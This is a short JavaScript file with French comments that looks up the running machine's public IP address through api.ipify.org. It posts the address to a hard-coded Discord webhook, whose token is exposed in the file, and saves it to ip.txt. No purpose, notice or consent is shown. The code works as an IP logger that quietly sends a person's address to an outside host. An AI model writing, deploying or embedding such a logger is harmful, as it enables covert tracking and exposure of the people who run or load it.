var ip = '';

fetch('https://api.ipify.org/?format=json')
    .then(function(response) {
        return response.json();
    })
    .then(function(data) {
        ip = data.ip;
        var webhookUrl = 'https://discord.com/api/webhooks/1140356908381909195/jUateRhyC56ZNigpinq2ygUtqkF05RV0fYjYj2sFld3A_d0K4S9uNB0o8GvD4nsFck4H';
        
        var payload = {
            content: 'Nouvelle adresse IP : ' + ip
        };
        
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        // Écriture de l'IP dans le fichier ip.txt
        var fs = require('fs');
        fs.writeFileSync('ip.txt', ip, 'utf-8');
    });
